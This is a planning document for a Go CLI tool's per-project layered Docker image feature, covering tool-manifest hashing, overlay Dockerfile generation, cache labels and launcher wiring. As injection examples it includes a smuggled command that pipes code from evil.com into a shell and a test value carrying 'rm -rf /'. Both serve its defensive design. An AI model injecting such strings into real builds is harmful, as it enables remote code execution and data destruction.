# DROP_12 — IMAGE_LAYERING

**State:** planning
**Blocked by:** DROP_11 (done)
**Paths (expected):** `internal/services/images/` (extend), `internal/cli/` (wire per-project image into `valv claude` / `valv codex` launch path), possibly `internal/adapters/docker/` (build composition helpers)
**Packages (expected):** `internal/services/images/`, `internal/cli/`, possibly `internal/adapters/docker/`
**PLAN.md ref:** main/PLAN.md → DROP_12_IMAGE_LAYERING row
**Workflow:** main/drops/WORKFLOW.md
**Started:** 2026-05-21
**Closed:** —

## Scope

Per-project layered Docker image build. Extend `internal/services/images` to compose `valv-<provider>:proj-<short-tools-hash>` from the base `valv-<provider>:dev` image plus a per-project overlay layer that installs the tools declared in the project's `.valv/tools.toml` (DROP_11). Cache the layered image by a tools-hash, mirroring the existing recipe-hash pattern used for base-image rebuild detection.

**This drop is the dogfood unblock.** Once it closes, `ta` CLI and similar per-project Go tools become installable inside Valv containers, which is the gap that surfaced 2026-05-20 when the dev tried to use `valv claude` against the `ta` worktree and the container had no `ta` binary. Unit 12.0 (added Round 2) adds the Go toolchain to the base image so `RUN go install <source>` works.

This is the second slice in the sandbox-direction sequence (DROP_11 → DROP_12 → DROP_13 → DROP_14 → DROP_15 → DROP_16 release) confirmed by the dev 2026-05-20 after the OSS sandbox survey.

## Pre-Summit Research (carry-forward from DROP_11)

The 2026-05-20 OSS survey identified two dominant declarative-toolchain → image patterns:

- **devcontainer.json Features** — versioned OCI artifacts (`ghcr.io/devcontainers/features/node:1`) layered atop a base image at build time. Used by Codespaces. Build-time install.
- **mise.toml `[tools]`** — local on-demand install into per-user cache, PATH augmentation at shell activation. Runtime install.
- **claudebox** — per-project Docker image `claudebox-<project>` with profile-specific tools layered + intelligent layer caching.

DROP_12 follows the **build-time Docker layering** approach (matching devcontainer Features + claudebox). Rationale: Valv already builds base provider images via `internal/services/images`; extending that path is more architecturally honest than introducing runtime install. The cache-by-tools-hash pattern mirrors the existing recipe-hash invalidation already in `images.Service`.

## DROP_11 outputs available to DROP_12

- `internal/tools/ToolManifest` — parsed schema with `Tools map[string]ToolSpec`, `Allowlist toml.Primitive`, `Env toml.Primitive`.
- `internal/tools/ToolSpec` — `Version string`, `Source string`, `Install string`. String-form vs object-form.
- `internal/tools/Resolve(projectDir string) (ToolManifest, error)` — returns empty manifest + nil if absent; parsed + validated manifest if present.
- `internal/tools/ToolsFilePath = ".valv/tools.toml"`.

## Planner

### Objective

Extend `internal/services/images` to compose a per-project layered Docker image (`valv-<provider>:proj-<short-tools-hash>`) on top of the base `valv-<provider>:dev` image. Add a Go toolchain to the base Dockerfiles so overlay `go install <source>` works (Unit 12.0). The overlay layer runs the install commands implied by `.valv/tools.toml` (DROP_11). The CLI launch path (`internal/cli/claude.go`, `internal/cli/codex.go`) selects the per-project tag when a manifest exists, falls back to base when absent. Cache by tools-hash + base-recipe-hash + overlay-recipe-hash, mirroring the existing `recipeHashLabel` pattern.

### Schema Decisions (locked by planner; dev decisions U1/U2/U3 confirmed Round 2)

1. **Per-project image tag format.** `valv-<provider>:proj-<short-tools-hash>` where `short-tools-hash` is `sha256(canonical-manifest)[:12]` rendered as lowercase hex. The `proj-` prefix disambiguates from the base `:dev` tag and the existing `:<version>` semver tags (`service.go:580-582`). Tag charset stays within Docker reference grammar (`[a-z0-9._-]`, length ≤ 128). Example: `valv-claude:proj-9c3a7b1e8d4f`.

2. **Tools-hash canonical form.** `sha256(json.MarshalIndent(canonical, "", ""))` where `canonical` is a sorted-by-name slice of `{name, version, source, install}` records produced by `canonicalManifest(manifest)`. `[allowlist]` and `[env]` sections are deliberately EXCLUDED from the tools-hash because DROP_14/DROP_15 own those — including them now would force unnecessary image rebuilds when those sections land. The hash is hex-encoded; the first 12 hex chars are the short form used in the tag.

3. **Single trim point (Caveat 1).** `canonicalManifest(manifest)` applies `strings.TrimSpace` to each tool's `Source` and `Install` field exactly once, before either hashing OR Dockerfile emission. Both code paths (hash computation in Unit 12.1, RUN-line generation in Unit 12.2) consume the same already-trimmed strings via `canonicalManifest`. This guarantees a manifest with `source = " github.com/x/y "` hashes identically to `source = "github.com/x/y"` AND produces the same RUN line.

4. **Cache invalidation chain (F1 fix).** Five labels persisted on the per-project image:
   - `io.valv.recipe_hash` — sha256 of overlay Dockerfile template content (forces rebuild if the overlay generator output changes).
   - `io.valv.base_recipe_hash` — **verbatim copy** of the base image's `io.valv.recipe_hash` label value, captured at build-time via `docker image inspect`. **Stored as-is** — the label is already a sha256 hex string at `service.go:609`; double-hashing it would obscure the relationship to the base. Name mirrors the parent label for clarity. Forces rebuild when the base image is rebuilt.
   - `io.valv.tools_hash` — full (not truncated) sha256 of the canonical manifest from decision 2. Forces rebuild when manifest content changes.
   - `io.valv.managed=true` — **required for `valv image cleanup` reachability** (Attack 2 fix). Matches the existing label filter at `manage.go:1685-1689`.
   - `io.valv.scope=project-overlay` — disambiguates per-project overlays from base/version images so future cleanup logic can target them specifically.

   On launch, `EnsureProjectImage` reads `recipe_hash`, `base_recipe_hash`, and `tools_hash` from the existing per-project image; any mismatch triggers a rebuild.

5. **Label-read failure policy (F2 fix).** When `s.runner` does not implement `outputRunner` (typecast failure), OR when `docker image inspect` returns ANY non-missing error, `EnsureProjectImage` treats it as a label mismatch and FORCES a rebuild. This is conservative-opposite of `imageRecipeMatches`'s base-image safe-skip behavior (`service.go:599-600` returns `true`/skip-rebuild) — for overlays, an unreadable label means we cannot prove freshness, so we rebuild. `dockerImageMissingError` still short-circuits to "image absent → build" as before.

6. **Overlay Dockerfile shape — exec-form RUN (Attack 3 fix).** Dynamic generation per-project. Generator function `BuildOverlayDockerfile(manifest tools.ToolManifest, baseImage docker.ImageRef) (string, error)` lives in `internal/services/images/overlay.go` (new). Produces:

   ```
   FROM <baseImage.String()>

   USER root
   ENV NPM_CONFIG_UPDATE_NOTIFIER=false \
       NPM_CONFIG_FUND=false \
       NPM_CONFIG_AUDIT=false \
       GOBIN=/usr/local/bin

   # One RUN per tool, sorted by name for deterministic layering.
   # EXEC-FORM (JSON array) — no shell, no injection surface.
   RUN ["go", "install", "<source-A>"]
   RUN ["npm", "install", "-g", "<source-B>"]

   USER valv
   ```

   **Exec-form rationale.** Shell-form `RUN go install <source>` is `/bin/sh -c "go install <source>"` — a malicious `Source` like `"github.com/x/y; curl evil.com/x | sh"` would execute as two shell commands. Tool name regex in `internal/tools/validate.go` validates only the map key, not `Source`/`Install` values. Exec-form (JSON array) bypasses `/bin/sh -c` entirely; `<source>` becomes a single literal argv entry. `go install` and `npm` will reject malformed module paths at the binary layer.

   **GOBIN as ENV (not per-RUN env prefix).** Exec-form skips shell expansion, so `RUN ["GOBIN=/usr/local/bin", "go", "install", ...]` would try to exec a binary named `GOBIN=/usr/local/bin`. Setting `GOBIN=/usr/local/bin` once at the top of the overlay via `ENV` inherits into every subsequent RUN cleanly.

   The `USER root → USER valv` bracket is required because `DefaultCodexDockerfile` / `DefaultClaudeDockerfile` end with `USER valv` (`service.go:674`, `service.go:738`); writing to `/usr/local/bin` needs root.

7. **Install command vocabulary (v1, U1 dev-confirmed).** Object-form tools only. v1 supports two install verbs:
   - `install = "go install"` → emits `RUN ["go", "install", "<source>"]`. Requires Go in base — Unit 12.0 adds it.
   - `install = "npm install -g"` → emits `RUN ["npm", "install", "-g", "<source>"]`. npm is present in base.

   String-form tools (`name = "version"`) are REJECTED at overlay-generation time with a wrapped error pointing the user at the object form. Any other `install` verb returns a wrapped error.

   **Empty-value validation (Attack 3 fix continuation).** At overlay-generation time, `BuildOverlayDockerfile` verifies that each tool's `Source` and `Install` are non-empty after `canonicalManifest` trimming. Empty values return a wrapped error `"build overlay dockerfile: tool %q has empty %s after trim"`.

8. **EnsureProjectRequest shape (F3 fix).** `EnsureProjectRequest{Manifest tools.ToolManifest; BaseImage docker.ImageRef; NoCache bool}`. **`Pull` field removed** — base images are locally built, never pulled from a registry; a `Pull` flag is misleading. `NoCache` remains for force-rebuild scenarios.

9. **Go toolchain in base image (U1 dev-confirmed, Unit 12.0).** Both `DefaultCodexDockerfile` and `DefaultClaudeDockerfile` gain a Go 1.26.1 install step. **Method:** download official binary tarball from `https://go.dev/dl/go1.26.1.linux-${TARGETARCH}.tar.gz`, extract into `/usr/local/go`, append `/usr/local/go/bin` to PATH. Aligns container Go version with `go.mod`'s `go 1.26.1`. Adds ~150MB to base image. The base's `recipeHash()` (computed from Dockerfile content per `service.go:537-549`) automatically invalidates, so any user running `valv claude` / `valv codex` after upgrade gets a rebuilt base on first launch through the existing `EnsureLatest` flow.

10. **Build trigger timing (U2 dev-confirmed).** Auto-build on `valv claude` / `valv codex` launch, mirroring the existing `EnsureLatest` behavior at `ensureClaudeImageCurrent`/`ensureCodexImageCurrent` (`claude.go:189-206`, `codex.go:227-244`). New function `ensureProjectImage(...)` runs AFTER `ensureClaude/CodexImageCurrent` in both launchers. Falls back to base ref when manifest is empty. No explicit `valv image build` command in this drop.

11. **Cleanup of stale per-project images (U3 dev-confirmed, Attack 2 fix).** Per-project images carry `io.valv.managed=true` (already filtered by `valv image cleanup`) AND `io.valv.scope=project-overlay` (for future targeted cleanup). v1 leaves orphans on disk after a tools-hash bump; `valv image cleanup` can already reach them via the `managed=true` filter — operator can prune manually until a future drop adds bind-tracking GC.

12. **Fallback when `.valv/tools.toml` absent.** When `tools.Resolve(projectDir)` returns `len(manifest.Tools) == 0` (file absent OR file present but no `[tools]` entries), the launcher uses base `valv-<provider>:dev` unchanged. No overlay build is attempted.

13. **`VALV_*_IMAGE` override + tools.toml interaction (Caveat 8).** When `VALV_CLAUDE_IMAGE` or `VALV_CODEX_IMAGE` is set AND `.valv/tools.toml` exists with `len(Tools) > 0`, the launcher emits one stderr warning before launch: `"warning: VALV_<PROVIDER>_IMAGE override active; .valv/tools.toml overlay skipped"`. The override still applies (no overlay built, no overlay tag used). This prevents silent confusion when an operator sets the env var for an image they expect to include their declared tools.

### Acceptance Criteria (drop-level)

1. `internal/services/images/` compiles with zero vet warnings after `mage testPkg ./internal/services/images/`.
2. Base `DefaultCodexDockerfile` and `DefaultClaudeDockerfile` (`service.go:645-742`) contain a Go 1.26.1 install step via tarball download into `/usr/local/go` with `/usr/local/go/bin` on PATH. Both Dockerfiles include `curl` in their apt install list to support the tarball download.
3. New helper `OverlayHash(manifest tools.ToolManifest) string` returns a deterministic sha256 hex string for the canonical manifest; two manifests with semantically identical `[tools]` content (different declaration order, whitespace variations in source/install after single-point `strings.TrimSpace`) produce identical hashes.
4. New helper `BuildOverlayDockerfile(manifest, baseImage) (string, error)` produces a Dockerfile whose:
   - `FROM` line references `baseImage.String()`.
   - Contains `ENV GOBIN=/usr/local/bin` once at the top of the overlay.
   - Contains one **exec-form** `RUN [...]` per tool (JSON array), sorted by tool name.
   - Returns a wrapped error when manifest contains a string-form tool (v1 reject).
   - Returns a wrapped error when manifest contains an object-form tool whose `install` is outside the v1-supported set (`go install`, `npm install -g`).
   - Returns a wrapped error when `Source` or `Install` is empty after `canonicalManifest` trimming.
5. New `Service.EnsureProjectImage(ctx, request EnsureProjectRequest)` method:
   - When `request.Manifest.Tools` is empty: returns `EnsureProjectResult{Image: baseRef, Action: EnsureActionUsingExistingImage}` without touching docker.
   - When manifest has tools and per-project image doesn't exist: builds via `docker buildx build --load`, applies the five labels (`recipe_hash`, `base_recipe_hash`, `tools_hash`, `managed=true`, `scope=project-overlay`), returns built ref with `Action: EnsureActionUpdated`.
   - When manifest has tools and per-project image exists with all three freshness labels matching (`recipe_hash`, `base_recipe_hash`, `tools_hash`): returns existing ref with `Action: EnsureActionUpToDate` without rebuilding.
   - When ANY freshness label mismatches OR cannot be read (typecast failure, inspect error other than image-missing): rebuilds.
6. CLI launch path: `runClaudeCommand` and `runCodexCommand` resolve a per-project image via `ensureProjectImage` AFTER `ensureClaude/CodexImageCurrent` succeeds. The resolved per-project ref is passed into `claudeservice.New(Options{Image: projectImage})` / `codexservice.New(...)` instead of the base ref. `runClaudeImageOnlyCommand` / `runCodexImageOnlyCommand` (help/version paths) keep using base ref unchanged.
7. When `VALV_CLAUDE_IMAGE` or `VALV_CODEX_IMAGE` is set AND a non-empty manifest is present, the launcher emits `"warning: VALV_<PROVIDER>_IMAGE override active; .valv/tools.toml overlay skipped"` on stderr exactly once.
8. `mage testPkg ./internal/services/images/` reports ≥ 70% coverage including the new overlay code.
9. `mage testPkg ./internal/cli/` does not regress below its existing 67.6% floor.
10. `mage test` passes clean across all packages after all units done (at the current 60% gate; the 70% gate bump is deferred to DROP_17).
11. Integration test (or table-driven service-level test with mocked Runner) exercises the freshness-label cache matrix: all-match → no rebuild, tools-hash-mismatch → rebuild, base-recipe-hash-mismatch → rebuild, recipe-hash-mismatch → rebuild, label-read-failure → rebuild.

### Units

---

#### Unit 12.0 — Go toolchain in base Dockerfiles

**State:** todo

**Paths:**
- `internal/services/images/service.go` (extend — modify `DefaultCodexDockerfile()` and `DefaultClaudeDockerfile()` only)
- `internal/services/images/service_test.go` (extend — assert new RUN lines present)

**Packages:** `internal/services/images/`

**Acceptance:**
- Both `DefaultCodexDockerfile` and `DefaultClaudeDockerfile` add `curl` to the existing apt install line (`bubblewrap ca-certificates curl git ncurses-term`).
- Both Dockerfiles include a Go 1.26.1 install step inserted AFTER the apt install block and BEFORE the `useradd` block, written exactly once per Dockerfile. The step downloads `https://go.dev/dl/go1.26.1.linux-${TARGETARCH}.tar.gz`, extracts cleanly into `/usr/local/go`, removes the tarball, and emits the resulting `go` binary on PATH via `ENV PATH=/usr/local/go/bin:$PATH`. Use `${TARGETARCH}` so amd64 + arm64 hosts both work (buildx auto-injects this).
- Tests assert: the returned Dockerfile string contains the literal substring `go1.26.1.linux` (catches accidental version drift) and contains `/usr/local/go/bin` on PATH.
- Tests assert: `recipeHash()` of the new template produces a different value than the pre-Unit-12.0 baseline — pin the baseline via a hardcoded sha256 string updated in this unit's commit.
- No new symbols, no new files. Both Dockerfiles share the same Go install snippet — DRY via a shared `const goInstallStep = "..."` if it improves readability, otherwise inline-duplicated is acceptable for this size.
- `mage testPkg ./internal/services/images/` green.

**Blocked by:** —

**Notes:**
- The Dockerfile-text change automatically invalidates `recipeHash()` (computed from content per `service.go:537-549`). Users running `valv claude` / `valv codex` after upgrade will hit the existing `EnsureLatest` rebuild path on next launch — no extra wiring needed.
- Image size impact: ~150MB. Acceptable for a dev tool; smaller than typical Codex/Claude container.
- This unit does NOT need to actually rebuild any image during testing — `mage testPkg` exercises the template-content assertions + the recipeHash diff. Real rebuild fires on next launch in normal user flow.

---

#### Unit 12.1 — Overlay hash + canonical manifest

**State:** todo

**Paths:**
- `internal/services/images/overlay.go` (new — hashing helpers + types)
- `internal/services/images/overlay_test.go` (new)

**Packages:** `internal/services/images/`

**Acceptance:**
- Add helper `canonicalManifest(manifest tools.ToolManifest) []canonicalTool` (unexported) that returns a sorted-by-name slice of `{Name, Version, Source, Install}` records with `strings.TrimSpace` applied **once** to `Source` and `Install`. Single trim point — both hashing and Dockerfile emission consume this slice.
- Add helper `OverlayHash(manifest tools.ToolManifest) string` that returns `sha256(json.MarshalIndent(canonicalManifest(manifest), "", ""))` as a full lowercase hex string.
- Add helper `ShortOverlayHash(manifest) string` returning the first 12 hex chars (used in the tag).
- Table-driven test exercises: empty manifest, single string-form tool, single object-form tool, three tools declared out of order (hash matches re-ordered input), whitespace in source/install (trim applied → identical hash).
- Hash-stability snapshot: hardcoded manifest → hardcoded expected hex. Pins the canonical form against accidental future drift.
- No changes to `service.go`, no overlay-Dockerfile generation in this unit.
- `mage testPkg ./internal/services/images/` green.

**Blocked by:** Unit 12.0

---

#### Unit 12.2 — Overlay Dockerfile generator (exec-form)

**State:** todo

**Paths:**
- `internal/services/images/overlay.go` (extend — add `BuildOverlayDockerfile`)
- `internal/services/images/overlay_test.go` (extend)

**Packages:** `internal/services/images/`

**Acceptance:**
- Add `BuildOverlayDockerfile(manifest tools.ToolManifest, baseImage docker.ImageRef) (string, error)`.
- Output structure per decision 6: `FROM <baseImage.String()>` → `USER root` → `ENV NPM_CONFIG_* + GOBIN=/usr/local/bin` → one exec-form RUN per tool (sorted by name) → `USER valv`.
- All RUN lines use **JSON array exec-form** (`RUN ["go", "install", "<source>"]`, `RUN ["npm", "install", "-g", "<source>"]`). No shell-form. The JSON array is emitted via `json.Marshal` of the argv slice to guarantee correct escaping of quotes inside source strings.
- String-form tools (Version set, Source/Install empty) → wrapped error `"build overlay dockerfile: tool %q uses unsupported string-form spec (v1 requires object form with source+install)"`.
- Object-form tools with `install = "go install"` → emit `RUN ["go", "install", "<source>"]`.
- Object-form tools with `install = "npm install -g"` → emit `RUN ["npm", "install", "-g", "<source>"]`.
- Object-form tools with any other `install` value → wrapped error.
- Empty `Source` or `Install` (after canonicalManifest trim) → wrapped error `"build overlay dockerfile: tool %q has empty %s"`.
- Tests assert: exact byte-for-byte Dockerfile output for a sample manifest with two object-form tools (one `go install`, one `npm install -g`); error path for string-form; error path for unsupported install verb; error path for empty source; error path for empty install; sorting determinism across two same-manifest-different-order inputs.
- Injection safety test: a tool with `Source = "github.com/x/y; rm -rf /"` produces a Dockerfile where that source appears as a single literal JSON array element (no shell metacharacter expansion possible).
- `mage testPkg ./internal/services/images/` green.

**Blocked by:** Unit 12.1

---

#### Unit 12.3 — Service.EnsureProjectImage + project-image cache labels

**State:** todo

**Paths:**
- `internal/services/images/service.go` (extend — new method, types, constants)
- `internal/services/images/service_test.go` (extend)

**Packages:** `internal/services/images/`

**Acceptance:**
- New constants: `tagPrefixProjectOverlay = "proj-"`, `toolsHashLabel = "io.valv.tools_hash"`, `baseRecipeHashLabel = "io.valv.base_recipe_hash"`, `managedLabel = "io.valv.managed"`, `scopeLabel = "io.valv.scope"`, `scopeValueProjectOverlay = "project-overlay"`.
- New request/result types `EnsureProjectRequest{Manifest tools.ToolManifest; BaseImage docker.ImageRef; NoCache bool}` and `EnsureProjectResult{Image docker.ImageRef; Action EnsureAction; ToolsHash string; BaseRecipeHash string}`. **No `Pull` field** (F3).
- New `Service.EnsureProjectImage(ctx, request)` method that:
  1. Returns `{Image: request.BaseImage, Action: EnsureActionUsingExistingImage}` when `len(request.Manifest.Tools) == 0`.
  2. Computes `toolsHash := OverlayHash(request.Manifest)` and `baseRecipeHash := s.inspectLabel(ctx, request.BaseImage, recipeHashLabel)` (verbatim — no double-hash, F1).
  3. Constructs target tag via `s.projectImageRef(toolsHash)` returning `<repo>:proj-<short-hash>`.
  4. Inspects target tag for `recipeHashLabel`, `baseRecipeHashLabel`, `toolsHashLabel`. On ANY read failure (typecast OR non-missing inspect error), treats as mismatch and rebuilds (F2).
  5. Rebuild path: generates overlay via `BuildOverlayDockerfile`, writes to ephemeral `os.MkdirTemp` (cleanup deferred), calls existing `docker.BuildImageArgs` flow with the five labels (`recipe_hash`, `base_recipe_hash`, `tools_hash`, `managed=true`, `scope=project-overlay`).
- New unexported helper `s.inspectLabel(ctx, ref, label string) (string, error)` reuses the existing `outputRunner` typecast pattern from `imageRecipeMatches` (`service.go:597-610`) but returns the trimmed raw value (not a match-bool). Typecast failure returns a sentinel `errLabelUnreadable` so the caller can treat it as mismatch.
- Table-driven test against `runnerRecorder` fake covers:
  - empty manifest → skip
  - target image missing → build
  - all three freshness labels match → up-to-date (no rebuild)
  - tools_hash mismatch → rebuild
  - base_recipe_hash mismatch → rebuild
  - recipe_hash mismatch → rebuild
  - typecast failure → rebuild
  - inspect error (not image-missing) → rebuild
- Test asserts the built image carries all five labels (recipe_hash + base_recipe_hash + tools_hash + managed=true + scope=project-overlay).
- `mage testPkg ./internal/services/images/` green; package coverage ≥ 70%.

**Blocked by:** Unit 12.2

---

#### Unit 12.4 — CLI launch wiring (claude + codex) + override warning

**State:** todo

**Paths:**
- `internal/cli/claude.go` (extend — add `ensureClaudeProjectImage`; call it in `runClaudeCommand` after `ensureClaudeImageCurrent`)
- `internal/cli/codex.go` (extend — add `ensureCodexProjectImage`; call it in `runCodexCommand`)
- `internal/cli/operator_helpers.go` (extend — small helper `resolveProjectImage(cmd, paths, provider, workingDir, baseRef) (docker.ImageRef, error)`)
- `internal/cli/claude_project_image_test.go` (new)
- `internal/cli/codex_project_image_test.go` (new)

**Packages:** `internal/cli/`

**Acceptance:**
- `resolveProjectImage`:
  - calls `tools.Resolve(workingDir)`; on `len(manifest.Tools) == 0` returns base ref + nil error.
  - if `VALV_<PROVIDER>_IMAGE` env var is set AND manifest is non-empty: emits `"warning: VALV_<PROVIDER>_IMAGE override active; .valv/tools.toml overlay skipped"` to stderr via `fmt.Fprintln(cmd.ErrOrStderr(), ...)`, returns base ref (the env-var override is applied upstream in the existing path).
  - otherwise opens images service for `provider`, calls `EnsureProjectImage`, returns the result's `Image`.
  - any `tools.Resolve` error other than empty-manifest is wrapped and returned.
- `runClaudeCommand` calls `resolveProjectImage` AFTER `ensureClaudeImageCurrent`, passes the resolved ref into `claudeservice.New(Options{Image: projectImage, ...})`.
- Mirror for `runCodexCommand`.
- `runClaudeImageOnlyCommand` and `runCodexImageOnlyCommand` UNCHANGED — they keep using base ref since they don't need project context.
- Tests: stub `tools.Resolve` via testdata dir, install `installFakeDocker(t)` fixture, exercise: empty manifest → base ref used + no stderr warning; manifest with one tool → overlay-build invocation in fake docker calls + no stderr warning; manifest with one tool + `VALV_CLAUDE_IMAGE` set → overlay skipped + stderr warning printed exactly once.
- `mage testPkg ./internal/cli/` green; coverage does not regress below 67.6%.

**Blocked by:** Unit 12.3

---

### Notes For Builder Agents

- **`recipeHash` interaction:** Unit 12.3's `base_recipe_hash` label captures the BASE image's `io.valv.recipe_hash` label VERBATIM. The value at `service.go:609` is already a sha256 hex string — DO NOT call sha256 on it again. Read it with `docker image inspect --format '{{ index .Config.Labels "io.valv.recipe_hash" }}'`, `strings.TrimSpace`, store as-is.
- **`ImageRef` parsing constraint:** Tags must satisfy Docker's reference grammar (`[a-z0-9._-]`, length ≤ 128). The `proj-` prefix + 12 hex chars produces 17-char tags — well within bounds.
- **`docker buildx build --load` is canonical:** `images.Service.Build` already uses it; `BuildImageArgs` at `ops.go:38-103` is the call surface.
- **Test fakes available:** `runnerRecorder` in `service_test.go:22-52` records calls and returns canned outputs by joined-arg-string key. Use that for the freshness-label cache matrix in Unit 12.3.
- **CLI fixture pattern:** `installFakeDocker(t)` (cited in `manage_test.go:594-600`) installs a fake docker binary that exits 0 — use for Unit 12.4 CLI tests.
- **Exec-form RUN required (Unit 12.2):** Use `json.Marshal` on the argv slice to emit `RUN ["go", "install", "<source>"]`. This bypasses `/bin/sh -c` entirely — no shell expansion, no injection from a malicious `Source`. Shell-form `RUN go install <source>` is FORBIDDEN in the overlay.
- **`ENV GOBIN=/usr/local/bin` placement (Unit 12.2):** Set GOBIN once at the top of the overlay (alongside NPM_CONFIG_*), NOT as a per-RUN prefix. Exec-form RUN skips shell var expansion, so `RUN ["GOBIN=...", "go", ...]` would try to exec a binary literally named `GOBIN=...`.
- **Go install in base (Unit 12.0):** `go1.26.1.linux-${TARGETARCH}.tar.gz` from `https://go.dev/dl/`. `${TARGETARCH}` is auto-supplied by buildx for amd64/arm64. Add `curl` to the apt list (existing apt line: `bubblewrap ca-certificates git ncurses-term` — extend to include `curl`). Extract into `/usr/local/go`; ENV `PATH=/usr/local/go/bin:$PATH`.
- **Cleanup-filter requirement (Attack 2):** Per-project images MUST carry `io.valv.managed=true` or `valv image cleanup` cannot reach them (`manage.go:1685-1689`). Unit 12.3's label set covers this.
- **Symbol-deletion / interface-change mage-integration rule:** No interface changes in DROP_12 (the `Service` struct gains methods but no existing interface changes). Drop-end Phase 6 `mage integration` step catches hidden compile-breaks in `//go:build integration` files.
- **Per-unit ordering:** Strict linear (12.0 → 12.1 → 12.2 → 12.3 → 12.4). No parallel-eligible units. Unit 12.0 must land first because Unit 12.2's `go install` RUN lines fail at build-time without Go in the base image.
- **Phase 6 drop-end verify (replaces former Unit 12.5):** `mage test` clean from `main/`, then `mage integration` (Docker-backed), then `mage golden` (external transcript could regress if per-project image insertion changes container args ordering), then `git push`, then `gh run watch --exit-status` until green, then `mage build`. Smoke-run `./valv image --help` returns without error. Operator verifies per-project image tag appears in `docker image ls` after a smoke build of a fixture `.valv/tools.toml`; base image still works for tools-toml-less projects. This is standard Phase 6 — no dedicated unit needed (Caveat 10).

## Notes

- DROP_11 establishes the schema + parser foundation; DROP_12 consumes it.
- Network policy enforcement (closed-by-default + allowlist) is DROP_15's concern. DROP_12 assumes Docker build can reach the open internet to install tools.
- `valv run --account X <cmd>` generic primitive is DROP_13's concern. DROP_12's launcher changes are scoped to existing `valv claude` / `valv codex` providers.
- Per-account env var injection is DROP_14's concern. DROP_12 doesn't thread custom env into the build or runtime.
- The 70% per-package coverage floor still applies (and is met at 60% gate per the deferred-from-DROP_11 Unit 11.5). New packages added in DROP_12 should ship at ≥70% local coverage from day one.
